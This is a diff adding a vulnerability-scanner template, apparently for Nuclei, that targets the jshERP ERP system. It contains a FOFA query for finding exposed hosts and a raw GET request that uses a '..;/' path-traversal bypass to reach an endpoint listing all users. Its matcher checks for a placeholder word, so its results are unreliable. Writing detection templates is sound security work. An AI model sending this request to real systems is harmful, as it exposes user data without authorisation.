@@ -1,0 +1,31 @@
+id: huxia-erp-user-info
+info:
+  tags: huxia-erp-user-info
+  name: huxia-erp-user-info
+  author: xc
+  severity: high
+  description: |-
+    fofa: icon_hash="978514697" || body="jshERP-boot"
+
+
+http:
+  - raw:
+      - |
+        GET /jshERP-boot/platformConfig/getPlatform/..;/..;/..;/jshERP-boot/user/getAllList HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2558.72 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'word'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
